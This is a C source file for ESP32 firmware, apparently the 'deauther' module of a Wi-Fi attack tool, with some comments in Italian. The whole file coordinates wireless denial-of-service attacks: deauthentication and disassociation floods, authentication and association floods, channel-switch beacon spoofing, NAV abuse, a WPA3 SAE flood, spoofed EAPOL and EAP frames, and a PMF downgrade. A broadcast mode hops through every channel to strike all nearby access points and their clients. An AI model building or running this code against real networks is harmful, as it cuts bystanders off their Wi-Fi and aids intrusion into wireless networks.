#include <freertos/FreeRTOS.h>
#include <esp_random.h>
#include <esp_log.h>
#include <rom/ets_sys.h>
#include <esp_timer.h>
#include "deauther.h"
#include "sniffer.h"
#include "utils.h"
#include "wifi_attacks.h"
#include "wifiMng.h"

#define DEAUTHER_TASK_PRIO 5
// Syncronization times
#define CHANNEL_SWITCH_DELAY 12   // Channel switch assestment time
#define ATTACK_WINDOW        250  // RCO duration
#define SOFTAP_REST_TIME     150   // Home channel time

static const char *TAG = "DEAUTHER";
static TaskHandle_t deauther_task_handle = NULL;
static deauther_attack_type_t current_attack_type = DEAUTHER_ATTACK_DEAUTH_FRAME;

// Global variables
static uint8_t random_mac[6];
static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static const uint8_t reason_code = 0x07;


/**
 * @brief Helper per calcolare un canale di switch valido per l'attacco CSA
 */
static uint8_t get_csa_switch_channel(uint8_t current_channel) {
    if (current_channel >= 1 && current_channel < 14) {
        return (current_channel % 13) + 1;
    } else if (current_channel >= 36) {
        return (current_channel == 165) ? 36 : current_channel + 4;
    }
    return 1;
}


/**
 * @brief Helper function that executes the selected attack on a specific BSSID
 * Assumes the radio is already on the correct channel!
 */
static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssid, uint8_t ap_channel)
{
    clients_t *clients = malloc(sizeof(clients_t));
    wifi_sniffer_get_clients(clients);
    bool clients_targeted = false;

    switch (current_attack_type) 
    {
        // --- ATTACCHI IBRIDI (Client Specifici -> Fallback Broadcast) ---
        case DEAUTHER_ATTACK_DEAUTH_FRAME:
        {
            if (clients != NULL && clients->count > 0) {
                for (int c = 0; c < clients->count; c++) {
                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
                        wifi_attack_deauth_basic(clients->client[c].mac, ap_bssid, reason_code);
                        clients_targeted = true;
                    }
                }
            }
            if (!clients_targeted) {
                wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
            }
            break;
        }

        case DEAUTHER_ATTACK_DISASSOC_FRAME:
        {
            if (clients != NULL && clients->count > 0) {
                for (int c = 0; c < clients->count; c++) {
                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
                        clients_targeted = true;
                    }
                }
            }
            if (!clients_targeted) {
                wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
            }
            break;
        }

        case DEAUTHER_ATTACK_BROADCAST_FLOOD:
        {
            if (clients != NULL && clients->count > 0) {
                for (int c = 0; c < clients->count; c++) {
                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
                        wifi_attack_deauth_basic(clients->client[c].mac, ap_bssid, reason_code);
                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
                        clients_targeted = true;
                    }
                }
            }
            if (!clients_targeted) {
                wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
                wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
            }
            break;
        }

        // --- ATTACCHI BASATI SULL'AP ---
        case DEAUTHER_ATTACK_AUTH_FLOOD:
        {
            wifi_attack_send_auth_frame(ap_bssid, random_mac);
            break;
        }

        case DEAUTHER_ATTACK_ASSOC_FLOOD:
        {
            wifi_attack_send_auth_frame(ap_bssid, random_mac);
            wifi_attack_send_assoc_req(ap_bssid, random_mac);
            break;
        }

        case DEAUTHER_ATTACK_CSA_SPOOFING:
        {
            uint8_t new_chanel = get_csa_switch_channel(ap_channel);
            wifi_attack_send_csa_beacon(ap_bssid, ap_bssid, new_chanel); 
            break;
        }

        case DEAUTHER_ATTACK_BEACON_SPAM:
        {
            if (ap_ssid != NULL && strlen(ap_ssid) > 0) {
                wifi_attack_deauth_client_negative_tx_power(ap_bssid, ap_channel, ap_ssid);
            }
            break;
        }

        case DEAUTHER_ATTACK_NAV_ABUSE:
        {
            // L'attacco NAV colpisce tutti sul canale, basta il BSSID
            wifi_attack_nav_abuse(ap_bssid);
            break;
        }

        case DEAUTHER_ATTACK_WPA3_SAE_FLOOD:
        {
            // Floodiamo l'AP con richieste SAE Commit
            wifi_attack_wpa3_sae_flood(ap_bssid);
            break;
        }

        // --- ATTACCHI CLIENT-SPECIFIC ---
        case DEAUTHER_ATTACK_EAPOL_LOGOFF:
        case DEAUTHER_ATTACK_EAPOL_START:
        case DEAUTHER_ATTACK_EAP_FAILURE:
        case DEAUTHER_ATTACK_EAP_ID_SPAM:
        case DEAUTHER_ATTACK_HANDSHAKE_BLOCK:
        {
            if (clients != NULL && clients->count > 0) 
            {
                for (uint8_t c = 0; c < clients->count; c++) 
                {
                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) 
                    {
                        if (current_attack_type == DEAUTHER_ATTACK_EAPOL_LOGOFF)
                            wifi_attack_deauth_ap_eapol_logoff(clients->client[c].mac, ap_bssid);
                        
                        else if (current_attack_type == DEAUTHER_ATTACK_EAPOL_START)
                            wifi_attack_deauth_ap_eapol_start(clients->client[c].mac, ap_bssid);
                        
                        else if (current_attack_type == DEAUTHER_ATTACK_EAP_FAILURE)
                            wifi_attack_deauth_client_eap_failure(clients->client[c].mac, ap_bssid);
                        
                        else if (current_attack_type == DEAUTHER_ATTACK_EAP_ID_SPAM)
                            wifi_attack_deauth_client_eap_rounds(clients->client[c].mac, ap_bssid);
                        
                        else if (current_attack_type == DEAUTHER_ATTACK_HANDSHAKE_BLOCK)
                            wifi_attack_deauth_client_invalid_PMKID(clients->client[c].mac, ap_bssid);
                    }
                }
            }
            break;
        }

        case DEAUTHER_ATTACK_PMF_DOWNGRADE:
        {
            if (clients != NULL && clients->count > 0) {
                for (int c = 0; c < clients->count; c++) {
                    if (memcmp(clients->client[c].bssid, ap_bssid, 6) == 0) {
                        // Inviamo Disassoc (per staccarlo) seguito da Assoc Req legacy
                        wifi_attack_send_disassoc(ap_bssid, clients->client[c].mac, reason_code);
                        // Spoofiamo il client che chiede di connettersi senza PMF
                        wifi_attack_send_assoc_req(ap_bssid, clients->client[c].mac);
                    }
                }
            }
            break;
        }

        default:
            wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
            break;
    }

    free(clients);
}


static void deauther_send_frames(const target_info_t *target)
{
    if (target == NULL) return;

    esp_fill_random(random_mac, sizeof(random_mac));
    random_mac[0] &= 0xFE; 
    random_mac[0] |= 0x02; 
    bool broadcast_target = isMacBroadcast(target->bssid);
    
    // --- MODALITÀ BROADCAST (Smart Hopping) ---
    if (broadcast_target) 
    {
        aps_info_t *aps = malloc(sizeof(aps_info_t));
        wifi_sniffer_get_aps(aps);
        if (aps == NULL || aps->count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            free(aps);
            return;
        }
        uint8_t target_channels[MAX_AP];
        uint8_t num_channels = 0;
        for (int i = 0; i < aps->count; i++) 
        {
            uint8_t ch = aps->ap[i].primary;
            bool exists = false;
            for (int k = 0; k < num_channels; k++) {
                if (target_channels[k] == ch) {
                    exists = true; break;
                }
            }
            if (!exists) {
                target_channels[num_channels++] = ch;
            }
        }
        for (uint8_t j = 0; j < num_channels; j++) 
        {
            uint8_t current_ch = target_channels[j];
            wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
            vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
            int64_t start_time = esp_timer_get_time();
            for (int i = 0; i < aps->count; i++) 
            {
                if (aps->ap[i].primary == current_ch) 
                {
                    // Burst di pacchetti
                    for(int k=0; k<5; k++) {
                        execute_attack_on_target(aps->ap[i].bssid, (const char*)aps->ap[i].ssid, current_ch);
                        ets_delay_us(2000); 
                    }
                }
                if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
            }
            int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
            if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
                vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
            }
            vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
        }
        free(aps);
    }
    // --- MODALITÀ SINGLE TARGET ---
    else 
    {
        wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
        vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
        int64_t start_time = esp_timer_get_time();
        while(true) {
            execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
            ets_delay_us(5000); 
            if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
        }
        int64_t elapsed = (esp_timer_get_time() - start_time) / 1000;
        if (elapsed < (ATTACK_WINDOW - CHANNEL_SWITCH_DELAY)) {
            vTaskDelay(pdMS_TO_TICKS((ATTACK_WINDOW - CHANNEL_SWITCH_DELAY) - elapsed));
        }
        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
    }
}


static void deauther_task(void *pvParameters)
{
    /* Get target information */
    target_info_t *target = target_get(TARGET_INFO_DEAUTHER);

    if(isMacBroadcast(target->bssid)) {
        wifi_start_sniffing(NULL, SNIFF_MODE_GLOBAL_MONITOR);
    }
    else {
        wifi_start_sniffing(target, SNIFF_MODE_TARGET_ONLY);
    }

    while(true)
    {
        deauther_send_frames(target);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
}


void deauther_start(const target_info_t *deauth_target, deauther_attack_type_t attack_type)
{
    if(deauth_target == NULL) {
        ESP_LOGE(TAG, "deauth_target is null.");
        return;
    }

    if( deauther_task_handle != NULL ) {   
        ESP_LOGE(TAG, "Deauther task already started.");
        return;
    }

    current_attack_type = attack_type;
    wifi_sniffer_start_channel_hopping();
    target_set(deauth_target, TARGET_INFO_DEAUTHER);
    xTaskCreate(deauther_task, "deauther_task", 4096, NULL, DEAUTHER_TASK_PRIO, &deauther_task_handle);
}


void deauther_stop(void)
{
    if (deauther_task_handle == NULL)
    {
        ESP_LOGE(TAG, "Deauther task is not running.");
        return;
    }
    wifi_sniffer_stop_channel_hopping();
    wifi_stop_sniffing();
    vTaskDelete(deauther_task_handle);
    deauther_task_handle = NULL;
}